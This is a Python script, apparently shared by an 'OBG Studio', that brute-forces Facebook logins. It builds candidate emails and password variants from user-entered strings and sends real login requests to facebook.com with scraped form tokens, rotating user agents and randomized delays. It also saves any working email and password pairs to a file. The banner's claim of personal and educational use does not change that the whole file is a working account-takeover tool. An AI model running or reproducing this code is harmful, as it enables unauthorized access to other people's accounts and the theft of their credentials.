#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    🔥 OBADA GAMES / OBG STUDIO 🔥                             ║
║            FACEBOOK CREDENTIAL TESTER - REAL HTTP ENGINE v2                   ║
║              Sequential Predictor with Live Stats & "sh" Command              ║
║                     للاستخدام الشخصي والتعليمي فقط                           ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import string
import asyncio
import aiohttp
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init(autoreset=True)
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Style.RESET_ALL

# ===================================================================
# الإعدادات العامة
# ===================================================================
PREDICTIONS = []       # قائمة التوقعات المدخلة (سلاسل طويلة)
VALID_ACCOUNTS = []    # الحسابات الصالحة التي تم العثور عليها
stats = {
    "tested": 0,       # إجمالي ما تم اختباره من أزواج (إيميل+باسورد)
    "valid": 0,
    "invalid": 0,
    "current": 0       # عدد اللي قاعد يتجرب حالياً (في هذا التوقع)
}
testing_active = False
current_prediction_index = 0

# وكلاء مستخدمين حقيقيين
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
]

# نطاقات إيميل شائعة
EMAIL_DOMAINS = ["@gmail.com", "@yahoo.com", "@outlook.com", "@hotmail.com", "@protonmail.com", "@icloud.com", "@fb.com", "@facebook.com"]

# ===================================================================
# دالة توليد الإيميلات من التوقع الواحد
# ===================================================================
def generate_emails_from_prediction(pred):
    """يستخرج أو يولّد إيميلات محتملة من التوقع (قد يكون اسم مستخدم أو إيميل مباشر)"""
    pred = pred.strip()
    emails = []
    # إذا كان النص يحتوي على @ (إيميل كامل)
    if '@' in pred:
        emails.append(pred)
    else:
        # نعتبر النص كاسم مستخدم
        # نزيل الرموز الغريبة إن وجدت لكن نبقيها كما هي
        for dom in EMAIL_DOMAINS:
            emails.append(f"{pred}{dom}")
            # بعض التنويعات مع أرقام (لتوسيع الاحتمالات)
            for i in range(1, 4):
                emails.append(f"{pred}{i}{dom}")
    return emails

# ===================================================================
# دالة توليد كلمة المرور من التوقع (نفس التوقع أو مع تغييرات بسيطة)
# ===================================================================
def generate_passwords_from_prediction(pred):
    """توليد كلمات مرور محتملة من التوقع (السلاسل الطويلة نفسها أو مع أرقام/رموز)"""
    pred = pred.strip()
    passwords = [pred]
    # إضافة بعض التحويلات البسيطة لزيادة الفرص
    passwords.append(pred.capitalize())
    passwords.append(pred.upper())
    # إضافة أرقام بسيطة
    for i in range(1, 4):
        passwords.append(f"{pred}{i}")
        passwords.append(f"{pred}!{i}")
    return list(set(passwords))  # إزالة التكرار

# ===================================================================
# دالة تسجيل الدخول الحقيقية إلى فيسبوك (POST)
# ===================================================================
async def facebook_login_real(email, password, session):
    """محاولة تسجيل دخول حقيقية، تعيد (النجاح، الرسالة)"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        # جلب صفحة الدخول لاستخراج الـ CSRF
        async with session.get('https://www.facebook.com/login.php', headers=headers) as resp:
            html = await resp.text()
            soup = BeautifulSoup(html, 'html.parser')
            form = {}
            for inp in soup.find_all('input', type='hidden'):
                name = inp.get('name')
                val = inp.get('value')
                if name and val:
                    form[name] = val
            form['email'] = email
            form['pass'] = password
            form['login'] = 'Log In'
    except Exception as e:
        return False, f"Get error: {str(e)[:40]}"

    try:
        async with session.post('https://www.facebook.com/login.php', data=form, headers=headers, allow_redirects=True) as resp:
            url = str(resp.url)
            if 'checkpoint' in url:
                return False, "Checkpoint (2FA required)"
            elif 'home.php' in url or url == 'https://www.facebook.com/' or '?sk=welcome' in url:
                return True, "Success"
            else:
                return False, "Invalid credentials"
    except Exception as e:
        return False, f"Post error: {str(e)[:40]}"

# ===================================================================
# اختبار توقع واحد (جميع الإيميلات وكلمات المرور المحتملة)
# ===================================================================
async def test_prediction(pred, session):
    global stats, VALID_ACCOUNTS
    emails = generate_emails_from_prediction(pred)
    passwords = generate_passwords_from_prediction(pred)
    
    # نجرب كل زوج (إيميل، باسورد) من هذا التوقع
    for email in emails:
        for pwd in passwords:
            if not testing_active:
                return False
            stats["current"] += 1
            success, msg = await facebook_login_real(email, pwd, session)
            stats["tested"] += 1
            if success:
                stats["valid"] += 1
                VALID_ACCOUNTS.append({"email": email, "password": pwd, "prediction": pred})
                # حفظ فوري في ملف
                with open("obg_valid_accounts.txt", "a") as f:
                    f.write(f"{email}:{pwd}\n")
                return True
            else:
                stats["invalid"] += 1
                # لا نطبع كل خطأ – فقط السطر الموحد
            # تأخير صغير بين كل محاولة
            await asyncio.sleep(random.uniform(0.2, 0.5))
    return False

# ===================================================================
# مستمع أوامر المستخدم (أمر sh)
# ===================================================================
async def command_listener():
    loop = asyncio.get_event_loop()
    while testing_active:
        try:
            cmd = await loop.run_in_executor(None, sys.stdin.readline)
            if cmd.strip().lower() == 'sh':
                print(f"\n{C}{'='*60}{W}")
                if VALID_ACCOUNTS:
                    print(f"{Y}✅ Valid accounts found so far ({len(VALID_ACCOUNTS)}):{W}")
                    for idx, acc in enumerate(VALID_ACCOUNTS, 1):
                        print(f"  {idx}. Email: {G}{acc['email']}{W} | Pass: {G}{acc['password']}{W}")
                else:
                    print(f"{R}⚠️ No valid accounts yet.{W}")
                print(f"{C}{'='*60}{W}")
        except:
            break

# ===================================================================
# المحرك الرئيسي
# ===================================================================
async def run_engine():
    global testing_active, current_prediction_index, stats
    testing_active = True
    # تشغيل مستمع الأوامر في الخلفية
    asyncio.create_task(command_listener())
    
    async with aiohttp.ClientSession() as session:
        total_pred = len(PREDICTIONS)
        for idx, pred in enumerate(PREDICTIONS, 1):
            if not testing_active:
                break
            current_prediction_index = idx
            # إعادة ضبط العداد الحالي لكل توقع
            stats["current"] = 0
            # عرض بداية اختبار التوقع
            print(f"\n{Y}[{idx}/{total_pred}] Testing prediction: {pred}{W}")
            success = await test_prediction(pred, session)
            if success:
                # وجدنا حساباً صالحاً – نستمر أم نتوقف؟ المستخدم يريد الاستمرار حتى نهاية كل التوقعات.
                # نكمل ببساطة، لكن يمكن وضع خيار.
                pass
            # تأخير بين التوقعات
            await asyncio.sleep(random.uniform(0.5, 1))
    
    testing_active = False

# ===================================================================
# واجهة الإدخال والإحصائيات المباشرة
# ===================================================================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{R}╔═══════════════════════════════════════════════════════════════════════════════╗{W}
{R}║                    🔥 OBADA GAMES / OBG STUDIO 🔥                             ║{W}
{R}║            FACEBOOK CREDENTIAL TESTER - REAL HTTP ENGINE v2                   ║{W}
{R}║              Sequential Predictor with Live Stats & "sh" Command              ║{W}
{R}║                     للاستخدام الشخصي والتعليمي فقط                           ║{W}
{R}╚═══════════════════════════════════════════════════════════════════════════════╝{W}
"""
    print(banner)

def update_stats_line():
    """تحديث سطر واحد يحتوي على الإحصائيات"""
    sys.stdout.write(f"\r{C}[📊] {W}الي صارو: {G}{stats['tested']}{W} | صحيح: {G}{stats['valid']}{W} | خطأ: {R}{stats['invalid']}{W} | قيد التجربة: {Y}{stats['current']}{W}   ")
    sys.stdout.flush()

async def stats_updater():
    """تحديث الإحصائيات كل 0.5 ثانية"""
    while testing_active:
        update_stats_line()
        await asyncio.sleep(0.5)
    # تحديث نهائي بعد التوقف
    update_stats_line()
    print()  # سطر جديد

# ===================================================================
# المدخل الرئيسي
# ===================================================================
def main():
    global PREDICTIONS
    clear_screen()
    print_banner()
    
    print(f"\n{Y}📝 Enter your predictions (long strings, one per line):{W}")
    print(f"{Y}   Example: Jdjdjm_hejsjdjjsjd_shhshshs_jejejeje{W}")
    print(f"{Y}   Type 'done' on a new line when finished.{W}\n")
    
    preds = []
    while True:
        try:
            line = input(f"{G}Prediction #{len(preds)+1} > {W}").strip()
            if line.lower() == 'done':
                break
            if line:
                preds.append(line)
                print(f"{C}✓ Added: {line}{W}")
        except KeyboardInterrupt:
            print(f"\n{R}Exiting...{W}")
            sys.exit(0)
    
    if not preds:
        print(f"{R}No predictions entered. Exiting.{W}")
        sys.exit(0)
    
    PREDICTIONS = preds
    print(f"\n{G}✅ Total predictions: {len(PREDICTIONS)}{W}")
    print(f"{Y}[*] Starting sequential testing in 3 seconds... (Type 'sh' to show found accounts){W}")
    time.sleep(3)
    
    # تشغيل المحرك وعارض الإحصائيات معاً
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(asyncio.gather(run_engine(), stats_updater()))
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user.{W}")
    finally:
        # عرض النتيجة النهائية
        print(f"\n{C}{'='*60}{W}")
        print(f"{Y}📊 Final Statistics:{W}")
        print(f"   Total tested: {stats['tested']}")
        print(f"   Valid accounts: {G}{stats['valid']}{W}")
        print(f"   Failed attempts: {R}{stats['invalid']}{W}")
        if VALID_ACCOUNTS:
            print(f"\n{G}✅ Valid accounts:{W}")
            for acc in VALID_ACCOUNTS:
                print(f"   {C}{acc['email']}{W} : {C}{acc['password']}{W}")
        else:
            print(f"\n{R}⚠️ No valid accounts found.{W}")
        print(f"{C}{'='*60}{W}")
        loop.close()
        sys.exit(0)

if __name__ == "__main__":
    main()

